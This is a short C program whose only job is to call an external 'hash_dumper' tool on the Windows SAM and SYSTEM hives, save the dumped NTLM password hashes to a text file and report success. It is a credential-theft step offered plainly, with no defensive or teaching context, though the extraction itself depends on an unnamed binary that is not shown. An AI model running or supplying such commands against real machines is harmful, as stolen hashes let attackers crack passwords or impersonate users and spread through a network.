#include <stdio.h>
#include <stdlib.h>

int main() {
    // Command to dump NTLM hashes from SAM and SYSTEM hives
    system("./hash_dumper --sam /path/to/sam --system /path/to/system > ntlm_hashes.txt");

    printf("NTLM hashes dumped successfully. Check ntlm_hashes.txt\n");
    return 0;
}
